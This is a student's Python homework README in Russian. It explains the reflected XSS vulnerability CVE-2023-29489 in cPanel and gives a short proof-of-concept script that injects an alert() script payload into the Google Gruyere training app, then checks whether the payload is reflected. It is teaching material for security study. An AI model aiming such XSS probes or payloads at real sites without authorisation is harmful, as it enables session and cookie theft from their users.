# Программирование на Python. Домашнее задание 10.
## Касьянов Павел Романович

В данной папке Вы можете найти следующие файлы:
  - main.py - PoC-скрипт для проверки уязвимости CVE-2023-29489 (Reflected XSS).

## Описание уязвимости

CVE-2023-29489 — уязвимость типа Reflected XSS в cPanel, вызванная тем, что сервер вставляет пользовательский ввод в HTML-страницу без экранирования. Это позволяет атакующему внедрить JavaScript-код, который выполнится в браузере жертвы при переходе по вредоносной ссылке.

## Ход решения

Для демонстрации уязвимости типа Reflected XSS выбрано своё тестовое приложение на базе Google Gruyere, чтобы можно было безопасно проверить и продемонстрировать атаку на реальном веб-приложении, не нарушая закон и не затрагивая чужие сервисы.

```python
import requests
from urllib.parse import quote

BASE_URL = "http://google-gruyere.appspot.com/354272086260015487277051777527730239931"

found_count = 0

for target in [BASE_URL + "/{payload}", BASE_URL + "/snippets.gtl?uid={payload}"]:
    payload='<script>alert("XSS")</script>'
    url = target.format(payload=quote(payload))
    response = requests.get(url)
    if payload in response.text:
        print(f"Уязвимость Reflected XSS обнаружена! Payload: {payload} вернулся неэкранированным")
    else:
        print(f"Уязвимость Reflected XSS не обнаружена: {payload}")
        print()
```

Код в результате работы вернул ответ:
```
Уязвимость Reflected XSS обнаружена! Payload: <script>alert("XSS")</script> вернулся неэкранированным
Уязвимость Reflected XSS обнаружена! Payload: <script>alert("XSS")</script> вернулся неэкранированным
```

Логика работы кода:
1. Формируем XSS-payload `<script>alert("XSS")</script>`.
2. Отправляем в две точки входа: путь URL (404-страница) и GET-параметр `uid`.
3. Проверяем, отражается ли payload в ответе сервера без экранирования.
4. Если payload найден в HTML-ответе «как есть» (без экранирования и фильтрации) — уязвимость подтверждена.

В реальных случаях атакующий находит параметр, значение которого отражается в HTML без экранирования, формирует URL с вредоносным JavaScript-кодом в этом параметре и отправляет ссылку жертве. Когда пользователь переходит по такой ссылке, вредоносный скрипт выполняется в его браузере, что может привести к краже cookies, сессий или перенаправлению на вредоносный сайт.